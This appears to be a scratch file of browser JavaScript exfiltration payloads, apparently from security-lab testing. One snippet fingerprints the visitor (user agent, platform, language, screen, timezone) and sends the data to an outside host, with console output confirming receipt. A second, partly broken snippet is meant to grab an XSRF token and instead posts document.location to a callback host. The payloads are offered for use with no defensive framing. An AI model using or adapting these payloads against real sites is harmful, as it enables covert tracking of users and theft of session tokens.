update:
  // Function to gather client information
        function clientInformation() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        // Function to send client information via POST
        function sendClientInfoViaPost() {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://lab.pro/index.php", true);
            xhr.setRequestHeader("Content-Type", "application/json");

            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        var response = JSON.parse(xhr.responseText);
                        console.log("Server Response (POST):", response);
                    } else {
                        console.error("Error (POST):", xhr.statusText);
                    }
                }
            };

            // Send the client information as a JSON payload
            xhr.send(JSON.stringify(clientInformation()));
        }

        // Function to send client information via GET
        function sendClientInfoViaGet() {
            var clientInfo = clientInformation();
            var queryString = Object.keys(clientInfo).map(key => key + '=' + encodeURIComponent(clientInfo[key])).join('&');

            var xhr = new XMLHttpRequest();
            xhr.open("GET", "https://lab.pro/index.php?" + queryString, true);

            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        var response = JSON.parse(xhr.responseText);
                        console.log("Server Response (GET):", response);
                    } else {
                        console.error("Error (GET):", xhr.statusText);
                    }
                }
            };

            // Send the request
            xhr.send();
        }

        // Call the functions to send client info
        sendClientInfoViaPost();
        sendClientInfoViaGet();


output if success:
undefined
VM3643:22 Server Response (POST): {status: 'success', message: 'Data received and logged.'}
VM3643:45 Server Response (GET): {status: 'success', message: 'Data received and logged.'}



-----




---
    
    function getXSRFToken() {
    var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://callback.com/?id=" + clientInformation(), true);
    xhr.setRequestHeader("Content-Type", "application/json");

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var response = JSON.parse(xhr.responseText);
            if (response && response._.$n) {
                var xsrfToken = response._.$n.messageId;
                sendToLabMachine(document.location);
            }
        }
    };

    xhr.send(JSON.stringify({
        your: "data",
        here: "value"
    }));
}

function sendToLabMachine(token) {
    var labXhr = new XMLHttpRequest();
    labXhr.open("POST", "https://callback.com/?id=", true);
    labXhr.setRequestHeader("Content-Type", "application/json");

    labXhr.onreadystatechange = function() {
        if (labXhr.readyState === 4 && labXhr.status === 200) {
            console.log("Token sent to lab machine successfully.");
        }
    };

    labXhr.send(JSON.stringify({
        xsrfToken: token
    }));
}

getXSRFToken();
